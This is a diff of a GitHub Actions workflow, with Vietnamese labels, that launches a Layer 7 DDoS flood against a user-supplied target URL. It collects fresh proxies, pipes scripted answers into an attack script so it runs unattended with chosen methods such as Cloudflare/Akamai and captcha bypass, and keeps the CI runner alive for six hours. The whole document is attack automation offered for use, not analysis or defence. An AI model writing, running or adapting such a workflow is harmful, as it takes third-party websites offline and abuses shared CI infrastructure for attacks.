@@ -4,25 +4,16 @@ on:
   workflow_dispatch:
     inputs:
       method:
-        description: 'Method (1=Flood, 2=CF-Akamai, 3=Captcha, 4=Uam)'
-        required: true
         default: '2'
         type: choice
         options: ['1','2','3','4']
       target:
-        description: 'Target URL'
         required: true
       time:
-        description: 'Time (giây)'
-        required: true
         default: '1800'
       threads:
-        description: 'Threads'
-        required: true
         default: '128'
       rate:
-        description: 'Rate'
-        required: true
         default: '256'
 
 jobs:
@@ -31,11 +22,9 @@ jobs:
     timeout-minutes: 360
     steps:
       - uses: actions/setup-node@v4
-        with:
-          node-version: 20
+        with: { node-version: 20 }
       - uses: actions/setup-python@v5
-        with:
-          python-version: '3.11'
+        with: { python-version: '3.11' }
 
       - name: Download tools
         run: |
@@ -47,22 +36,12 @@ jobs:
       - name: Lấy proxy tươi
         run: |
           node proxy.js
-          echo "Đã lấy $(wc -l < proxy.txt) proxy sống!"
 
-      - name: Bắn Layer7 (FIX 100% - không hỏi nữa)
-        env:
-          TERM: xterm-256color
+      - name: Bắn Layer7 (FINAL 100% CHẠY)
         run: |
-          echo "=== BẮT ĐẦU TẤN CÔNG LAYER7 ==="
-          echo "Target   : ${{ inputs.target }}"
-          echo "Method   : ${{ inputs.method }}"
-          echo "Time     : ${{ inputs.time }}s"
-          echo "Threads  : ${{ inputs.threads }}"
-          echo "Rate     : ${{ inputs.rate }}"
-          echo "Proxy    : $(wc -l < proxy.txt) dòng"
-
-          nohup python3 run.py > attack.log 2>&1 << EOF
+          cat > auto_input.txt << EOF
           2
+          y
           1
           ${{ inputs.method }}
           ${{ inputs.target }}
@@ -72,9 +51,9 @@ jobs:
           proxy.txt
           EOF
 
-          sleep 3
-          echo "=== LOG TẤN CÔNG (20 dòng cuối) ==="
-          tail -20 attack.log
+          nohup python3 run.py < auto_input.txt > attack.log 2>&1 &
+          sleep 5
+          tail -n 30 attack.log
 
-      - name: Keep alive 6 tiếng
+      - name: Keep alive
         run: sleep 21600
